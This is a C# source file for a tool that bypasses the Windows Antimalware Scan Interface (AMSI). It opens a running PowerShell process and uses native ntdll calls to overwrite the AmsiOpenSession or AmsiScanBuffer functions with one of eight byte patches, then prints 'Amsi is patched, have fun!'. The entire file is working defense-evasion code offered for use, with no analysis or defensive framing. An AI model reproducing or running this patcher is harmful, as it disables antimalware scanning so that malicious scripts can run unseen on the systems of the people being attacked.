using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace MultiAmBy
{
    internal class Program
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint LdrLoadDll(IntPtr PathToFile, uint Flags, ref UNICODE_STRING ModuleFileName, out IntPtr ModuleHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtClose(IntPtr hObject);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint LdrUnloadDll(IntPtr ModuleHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint BufferSize, out uint BytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint LdrGetProcedureAddress(IntPtr hModule, IntPtr ProcedureName, int ProcedureNumber, out IntPtr pFunction);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public uint Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        static void Main(string[] args)
        {

            if (args.Length != 1)
            {
                Console.WriteLine("USAGE: {0}.exe <patch type>", Process.GetCurrentProcess().ProcessName);
                Console.WriteLine("[1] OpenSession jne");
                Console.WriteLine("[2] OpenSession ret");
                Console.WriteLine("[3] OpenSession jmp");
                Console.WriteLine("[4] ScanBuffer ret");
                Console.WriteLine("[5] ScanBuffer RastaMouse");
                Console.WriteLine("[6] ScanBuffer ACCESSDENIED");
                Console.WriteLine("[7] ScanBuffer HANDLE");
                Console.WriteLine("[8] ScanBuffer OUTOFMEMORY");
                Environment.Exit(1);
            }
            //int procId = Convert.ToInt32(args[0]);
            int procId = Process.GetProcessesByName("Powershell")[0].Id;
            // Open the target process and get a handle to its memory
            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID cid = new CLIENT_ID();
            cid.UniqueProcess = new IntPtr(procId);

            uint ntStatus = NtOpenProcess(out hProcess, 0x1F0FFF, ref oa, ref cid);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to open process: {0}", ntStatus);
                return;
            }

            switch (Convert.ToInt32(args[0]))
            {
                case 1:
                    AmPatch(hProcess, 3, "jne", 0x3);
                    break;
                case 2:
                    AmPatch(hProcess, 3, "ret", 0x3);
                    break;
                case 3:
                    AmPatch(hProcess, 3,  "jmp", 0x3);
                    break;
                case 4:
                    AmPatch(hProcess, 4, "ret", 0x0);
                    break;
                case 5:
                    AmPatch(hProcess, 4, "RastaMouse", 0x0);
                    break;
                case 6:
                    AmPatch(hProcess, 4, "AccessDenied", 0x0);
                    break;
                case 7:
                    AmPatch(hProcess, 4, "Handle", 0x0);
                    break;
                case 8:
                    AmPatch(hProcess, 4, "OutofMemory", 0x0);
                    break;
                default:
                    Console.WriteLine("[!] Wrong Option");
                    break;
            }

            Environment.Exit(0);
        }

        static void AmPatch(IntPtr hProcess, int ordinal, string patchType, int offset)
        {
            // Load the amsi.dll library and get the function address
            UNICODE_STRING ModuleFileName = new UNICODE_STRING();
            RtlInitUnicodeString(ref ModuleFileName, "amsi.dll");
            IntPtr hModule = IntPtr.Zero;
            uint ntStatus = LdrLoadDll(IntPtr.Zero, 0, ref ModuleFileName, out hModule);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to load amsi.dll: {0}", ntStatus);
                NtClose(hProcess);
                return;
            }

            IntPtr pFunction = IntPtr.Zero;

            ntStatus = LdrGetProcedureAddress(hModule, IntPtr.Zero, ordinal, out pFunction);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to find function: {0}", ntStatus);
                LdrUnloadDll(hModule);
                NtClose(hProcess);
                return;
            }

            // Modify the memory protection of the function
            IntPtr protectionBase = pFunction + offset;
            IntPtr regionSize = new IntPtr(1);
            uint oldProtect = 0;
            uint newProtect = 0x40;

            ntStatus = NtProtectVirtualMemory(hProcess, ref protectionBase, ref regionSize, newProtect, out oldProtect);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to modify memory protection: {0}", ntStatus);
                LdrUnloadDll(hModule);
                NtClose(hProcess);
                return;
            }

            byte[] patch;

            if (patchType == "jne")
            {
                patch = new byte[] { 0x75 };
            }
            else if (patchType == "ret")
            {
                patch = new byte[] { 0xc3 };
            }
            else if (patchType == "RastaMouse")
            {
                patch = new byte[] { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xc3 };
            }
            else if (patchType == "AccessDenied")
            {
                patch = new byte[] { 0xb8, 0x05, 0x00, 0x07, 0x80, 0xc3 };
            }
            else if (patchType == "Handle")
            {
                patch = new byte[] { 0xb8, 0x06, 0x00, 0x07, 0x80, 0xc3 };
            }
            else if (patchType == "OutofMemory")
            {
                patch = new byte[] { 0xb8, 0x0e, 0x00, 0x07, 0x80, 0xc3 };
            }
            else
            {
                patch = new byte[] { 0xEB };
            }
            // Write the patch to the function
            uint bytesWritten = 0;

            ntStatus = NtWriteVirtualMemory(hProcess, pFunction + offset, patch, (uint)patch.Length, out bytesWritten);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to write to process memory: {0}", ntStatus);
            }

            // Restore the original memory protection of the function
            ntStatus = NtProtectVirtualMemory(hProcess, ref protectionBase, ref regionSize, oldProtect, out oldProtect);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to restore memory protection: {0}", ntStatus);
            }

            Console.WriteLine("Amsi is patched, have fun!");

            // Unload the amsi.dll library
            ntStatus = LdrUnloadDll(hModule);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to unload amsi.dll: {0}", ntStatus);
            }

            // Close the process handle
            ntStatus = NtClose(hProcess);
            if (ntStatus != 0)
            {
                Console.WriteLine("Failed to close process handle: {0}", ntStatus);
            }
        }
    }
}
